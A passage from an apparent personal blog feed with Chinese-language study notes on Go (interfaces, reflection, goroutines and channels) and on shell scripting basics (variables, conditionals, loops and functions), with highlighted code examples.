class="hljs-keyword">interface</span> &#123;<br>    <span class="hljs-comment">//只能有函数</span><br>    GetType() <span class="hljs-type">string</span><br>    GetColor() <span class="hljs-type">string</span><br>    <span class="hljs-comment">//kind string</span><br>    <span class="hljs-comment">//color string</span><br>&#125;<br>   <br><span class="hljs-keyword">type</span> Cat <span class="hljs-keyword">struct</span> &#123;<br>    kind  <span class="hljs-type">string</span><br>    color <span class="hljs-type">string</span><br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Cat)</span></span> GetType() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">return</span> this.kind<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Cat)</span></span> GetColor() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">return</span> this.color<br>&#125;<br>   <br><span class="hljs-keyword">type</span> Dog <span class="hljs-keyword">struct</span> &#123;<br>    kind  <span class="hljs-type">string</span><br>    color <span class="hljs-type">string</span><br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Dog)</span></span> GetType() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">return</span> this.kind<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Dog)</span></span> GetColor() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">return</span> this.color<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetAnimal</span><span class="hljs-params">(animal Animal)</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;color is:&quot;</span>, animal.GetColor())<br>    fmt.Println(<span class="hljs-string">&quot;type is :&quot;</span>, animal.GetType())<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    cat := Cat&#123;<span class="hljs-string">&quot;Cat&quot;</span>, <span class="hljs-string">&quot;blue&quot;</span>&#125;<br>    GetAnimal(&amp;cat)<br>   <br>    dog := Dog&#123;<br>        kind:  <span class="hljs-string">&quot;Dog&quot;</span>,<br>        color: <span class="hljs-string">&quot;yellow&quot;</span>,<br>    &#125;<br>    fmt.Println(dog)<br>    GetAnimal(&amp;dog)<br>&#125;<br>   <br>   <br></code></pre></td></tr></table></figure></li></ol><h3 id="万能类型"><a href="#万能类型" class="headerlink" title="万能类型"></a>万能类型</h3><ol><li><p><code>interface&#123;&#125;</code>相当于<code>void</code></p></li><li><p>代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>    name <span class="hljs-type">string</span><br>    age  <span class="hljs-type">int</span><br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">function</span><span class="hljs-params">(arg <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>    fmt.Println(arg)<br>    fmt.Printf(<span class="hljs-string">&quot;and type is: %T \n&quot;</span>, arg)<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    person := Person&#123;<br>        name: <span class="hljs-string">&quot;chg&quot;</span>,<br>        age:  <span class="hljs-number">20</span>,<br>    &#125;<br>    <span class="hljs-keyword">var</span> f <span class="hljs-type">float32</span> = <span class="hljs-number">2.5</span><br>    function(<span class="hljs-number">2.4</span>)<br>    function(f)<br>    function(<span class="hljs-number">1</span>)<br>    function(person)<br>&#125;<br>   <br>   <br></code></pre></td></tr></table></figure></li><li><p>万能类型提供断言，可以查看是否是某种变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IsString</span><span class="hljs-params">(arg <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>    value, isString := arg.(<span class="hljs-type">string</span>)<br>    <span class="hljs-keyword">if</span> isString &#123;<br>        fmt.Println(value)<br>        fmt.Println(<span class="hljs-string">&quot;this is string&quot;</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fmt.Println(value) <span class="hljs-comment">//不是的话打印换行符</span><br>        fmt.Println(<span class="hljs-string">&quot;this not string&quot;</span>)<br>    &#125;<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    IsString(<span class="hljs-string">&quot;string&quot;</span>)<br>    IsString(<span class="hljs-number">3.4</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>变量里面的<code>pair</code></p><p>每一个变量都有一个<code>pair</code>于是可以对</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20230621104506638.png"></p></li></ol><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><ol><li><p><code>reflect</code>包</p><p>提供了两个函数用于获取变量的<code>pair</code>从而获取到值和类型</p><p>这个用于对于未知类型变量的处理</p></li><li><p>结构体标签</p><ul><li><p>语法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;reflect&quot;</span><br>)<br>     <br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>    Name <span class="hljs-type">string</span>  <span class="hljs-string">`info:&quot;name&quot; doc:&quot;我的名字&quot;`</span><br>    High <span class="hljs-type">float64</span> <span class="hljs-string">`info:&quot;high&quot;`</span><br>    Age  <span class="hljs-type">int</span>     <span class="hljs-string">`info:&quot;age&quot;`</span><br>&#125;<br>     <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">findTag</span><span class="hljs-params">(T any)</span></span> &#123;<br>    str := reflect.TypeOf(T)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; str.NumField(); i++ &#123;<br>        tag := str.Field(i).Tag<br>        fmt.Println(tag)<br>    &#125;<br>&#125;<br>     <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> person Person<br>    findTag(person)<br>&#125;<br></code></pre></td></tr></table></figure><p>​</p></li></ul></li></ol><p></p><h3 id="线程和协程"><a href="#线程和协程" class="headerlink" title="线程和协程"></a>线程和协程</h3><p>   <img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20230622132047575.png"></p><ol><li><p>创建<code>goroutine</code>相当于创建一个线程</p><p>只用普通函数创建线程</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">goRoutine</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>        fmt.Println(<span class="hljs-string">&quot;this is goroutine : &quot;</span>, i)<br>        time.Sleep(time.Second)<br>    &#125;<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    i := <span class="hljs-number">0</span><br>    <span class="hljs-keyword">go</span> goRoutine()<br>    <span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">10</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;this is main : &quot;</span>, i)<br>        time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>        i++<br>    &#125;<br>&#125;<br>   <br>   <br></code></pre></td></tr></table></figure><p>使用匿名函数创建线程</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is A.defer&quot;</span>)<br>i := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">10</span> &#123;<br>i++<br>fmt.Println(<span class="hljs-string">&quot;this is goRoutine : &quot;</span>, i)<br>time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;A&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>runtime.Goexit() <span class="hljs-comment">//退出当前的goroutine</span><br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is B.defer&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;this is B&quot;</span>)<br>&#125;()<br>&#125;() <span class="hljs-comment">//加小括号是为了调用</span><br>    <br>    <br></code></pre></td></tr></table></figure></li><li><p>线程之间的沟通</p><ul><li><p>chan </p><p>使用chan 保持线程之间的联系，这个变量能够维持线程之间的秩序，保持main后退出。也就是说如果chan没有值，就会阻塞</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;main.defer&quot;</span>)<br>    <span class="hljs-keyword">var</span> c <span class="hljs-keyword">chan</span> any = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> any)<br>     <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;A.defer&quot;</span>)<br>        c &lt;- <span class="hljs-number">888</span><br>    &#125;()<br>    g := &lt;-c<br>    fmt.Println(g)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>无缓冲的chan</p><blockquote><p>当一个<code>goroutine</code>向无缓冲的<code>chan</code>发送数据时，如果没有其他<code>goroutine</code>正在等待接收数据，发送的<code>goroutine</code>会被阻塞，直到有其他<code>goroutine</code>准备好接收数据为止。同样地，当一个<code>goroutine</code>从无缓冲的<code>chan</code>接收数据时，如果没有其他<code>goroutine</code>正在等待发送数据，接收的<code>goroutine</code>也会被阻塞，直到有其他<code>goroutine</code>准备好发送数据为止。</p><p>无缓冲的<code>chan</code>可以用于实现两个<code>goroutine</code>之间的同步，确保在数据交换之前两个<code>goroutine</code>都准备好。它们可以用于控制并发的执行顺序，防止数据竞争和资源争用。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>      <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;main.defer&quot;</span>)<br>      <span class="hljs-keyword">var</span> c <span class="hljs-keyword">chan</span> any = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> any)<br>       <br>      <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>          <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;A.defer&quot;</span>)<br>          c &lt;- <span class="hljs-number">888</span><br>      &#125;()<br>      g := &lt;-c<br>      fmt.Println(g)<br>  &#125;<br></code></pre></td></tr></table></figure></li><li><p>有缓冲的chan</p><blockquote><p>有缓冲的<code>chan</code>允许在发送（<code>chan &lt;- value</code>）和接收（<code>value &lt;- chan</code>）数据时不会立即发生阻塞，除非缓冲区已满或为空。当缓冲区未满时，发送操作会将数据放入缓冲区，并立即返回，而不会阻塞发送的<code>goroutine</code>。同样地，当缓冲区不为空时，接收操作会从缓冲区中取出数据，并立即返回，而不会阻塞接收的<code>goroutine</code>。</p><p>当缓冲区已满时，发送操作会导致发送的<code>goroutine</code>阻塞，直到有其他<code>goroutine</code>从缓冲区中取出数据为止。同样地，当缓冲区为空时，接收操作会导致接收的<code>goroutine</code>阻塞，直到有其他<code>goroutine</code>向缓冲区发送数据为止。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go">       <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;main 工作完毕&quot;</span>)<br>    c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;子线程工作完毕&quot;</span>)<br>        i := <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">4</span> &#123;<br>            i++<br>            c &lt;- i<br>            fmt.Println(<span class="hljs-string">&quot;子线程 传输元素为：&quot;</span>, i, <span class="hljs-string">&quot; len(c) &quot;</span>, <span class="hljs-built_in">len</span>(c), <span class="hljs-string">&quot; cap(c) &quot;</span>, <span class="hljs-built_in">cap</span>(c))<br>       <br>        &#125;<br>    &#125;()<br>    time.Sleep(time.Second * <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>        num := &lt;-c<br>        fmt.Println(<span class="hljs-string">&quot;main 接收到元素为：&quot;</span>, num, <span class="hljs-string">&quot; len(c) &quot;</span>, <span class="hljs-built_in">len</span>(c), <span class="hljs-string">&quot; cap(c) &quot;</span>, <span class="hljs-built_in">cap</span>(c))<br>    &#125;<br>    time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>&#125;<br>       <br></code></pre></td></tr></table></figure></li><li><p>关闭channel</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20230622150712214.png"></p></li><li><p>channel和range的关系</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20230622182950143.png"></p><p>也就是说我们可以使用<code>range</code>遍历<code>channel</code></p></li><li><p><code>channel</code>和<code>select</code></p><p>可以多路的监控<code>channel</code>状态</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20230623132432632.png"></p></li></ul></li></ul></li></ol><h2 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h2>]]></content>
    
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell</title>
    <link href="/2023/05/06/linux/shell/"/>
    <url>/2023/05/06/linux/shell/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h1><h2 id="运行方法"><a href="#运行方法" class="headerlink" title="运行方法"></a>运行方法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">方法一  直接运行解释器</span><br>sh hello.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">方法二  使用可执行文件</span><br>chmod +x hello.sh<br>./hello.sh<br></code></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ol><li><p>系统变量</p><p>系统变量有$HOME、$PWD、$USER等</p></li><li><p>自定义变量</p><ul><li><p>创建变量</p><p>变量名&#x3D;变量值，等号两侧不能有空格，变量名一般习惯用<strong>大写</strong>。</p></li><li><p>删除变量</p><p><code>unset 变量名</code></p></li><li><p>声明静态变量</p><p><code>readonly +变量名</code></p><p>静态变量不能unset</p></li><li><p>使用变量</p><p><code>$name</code></p></li></ul></li></ol><h3 id="将命令返回值赋给变量重点"><a href="#将命令返回值赋给变量重点" class="headerlink" title="将命令返回值赋给变量重点"></a>将命令返回值赋给变量重点</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">A=`ls`<br>A=$(ls)<br></code></pre></td></tr></table></figure><h3 id="shell环境变量"><a href="#shell环境变量" class="headerlink" title="shell环境变量"></a>shell环境变量</h3><ol><li>export 变量名&#x3D;变量值，将 Shell 变量输出为环境变量。</li><li>source 配置文件路径，让修改后的配置信息立即生效。</li><li>echo $变量名，检查环境变量是否生效。</li></ol><h3 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h3><h4 id="位置参数变量"><a href="#位置参数变量" class="headerlink" title="位置参数变量"></a>位置参数变量</h4><p><strong>基本语法</strong></p><ul><li>$n ：$0 代表命令本身、$1-$9 代表第1到9个参数，10以上参数用花括号，如 ${10}。</li><li>$* ：命令行中所有参数，且把所有参数看成一个整体。</li><li>$@ ：命令行中所有参数，且把每个参数区分对待。</li><li>$# ：所有参数个数。</li></ul><h3 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h3><p><strong>基本语法</strong></p><ul><li>$$ ：当前进程的 PID 进程号。</li><li>$! ：后台运行的最后一个进程的 PID 进程号。</li><li>$? ：最后一次执行的命令的返回状态，0为执行正确，非0执行失败。</li></ul><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p><strong>基本语法</strong></p><ul><li>$((运算式)) 或 $[运算式]</li><li>expr m + n 注意 expr 运算符间要有空格</li><li>expr m - n</li><li>expr *，&#x2F;，% 分别代表乘，除，取余</li></ul><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h3><p><code>[ condition ] </code>注意condition前后都要有空格</p><p>非空返回0，0为 true，否则为 false</p><p><code>if语句</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!bin/bash</span><br>Int1=1;<br>Int2=2;<br>if [ $Int1 == $Int2]<br>then<br>        echo &quot;等&quot;<br>else<br>        echo &quot;不相等&quot;<br>fi<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">Int3=3;<br><br>if [ $Int3 -lt 0 ]<br>then<br>        echo &quot;&lt;0&quot;<br>elif [ $Int3 -lt 3 ]<br>then<br>        echo &quot;&lt;3&quot;<br>else<br>        echo &quot;&gt;=3&quot;<br>fi<br><span class="hljs-meta prompt_"># </span><span class="language-bash">注意-lt是小于的意思</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-gt是大于的意思</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-ge是大于等于</span><br></code></pre></td></tr></table></figure><p><code>case语句</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!bin/bash</span><br>case $1 in<br>        &quot;1&quot;)<br>                echo &quot;1&quot;<br>                ;;<br>        &quot;2&quot;)<br>                echo &quot;2&quot;<br>                ;;<br>        *)<br>                echo &quot;其他&quot;<br>                ;;<br>esac<br><br></code></pre></td></tr></table></figure><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a><code>for</code>循环</h3><p><code>for循环</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">for i in &quot;$@&quot;<br>do<br>        echo &quot;$i  &quot;;<br>done<br>echo &quot;========&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">结果：</span><br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>========<br></code></pre></td></tr></table></figure><p>由此可见，结果是竖着的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">for i in &quot;$*&quot;<br>do<br>        echo &quot;$i  &quot;;<br>done<br>echo &quot;========&quot;<br><br>1 2 3 4 5 6 7 8 9<br>========<br></code></pre></td></tr></table></figure><p>结果是横着的</p><p><code>C语言风格的for</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>for ((i=0; i&lt;10; i++))<br>do<br>echo &quot;hahah&quot;<br>done<br></code></pre></td></tr></table></figure><p>使用<code>&#123;&#125;</code>的<code>for</code>循环</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!bin/bash</span><br><br>SUM=0<br><br>for i in &#123;1..100&#125;<br>do<br>        SUM=$(($SUM+$i))<br>done<br><br>echo $SUM<br></code></pre></td></tr></table></figure><p>使用<code>seq</code>的<code>for</code>循环</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!bin/bash</span><br><br>SUM=0<br><br>for i in $(seq 1 100)<br>do<br>        SUM=$(($SUM+$i))<br>done<br><br>echo $SUM<br></code></pre></td></tr></table></figure><p><code>while</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">i=0;<br>while [ $i -lt 10 ]<br>do<br>        echo $i<br>        i=$((i+1))<br>done<br><br></code></pre></td></tr></table></figure><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p><code>read -p &quot;输入一个数字:&quot;NUM</code></p><p><code>read -t &quot;在10秒中输入一个数&quot;NUM</code></p><p><code>read num</code>将值赋给<code>num</code></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">标准</span><br>function 函数名()&#123;<br>指令<br>return n<br>&#125;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">简写</span><br>function 函数名 &#123;<br>指令<br>return n<br>&#125;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">简写</span><br>函数名&#123;<br>指令<br>return n<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>程序执行的顺序</strong></p><p>系统别名-&gt;函数-&gt;系统命令-&gt;可执行文件</p><p><strong>其他知识点</strong></p><ol><li><p><code>return </code>是退出函数</p><p>exit 退出文件</p></li></ol><h4 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash test1<br><span class="hljs-meta prompt_">#</span><span class="language-bash">与嗲用可执行文件一样</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
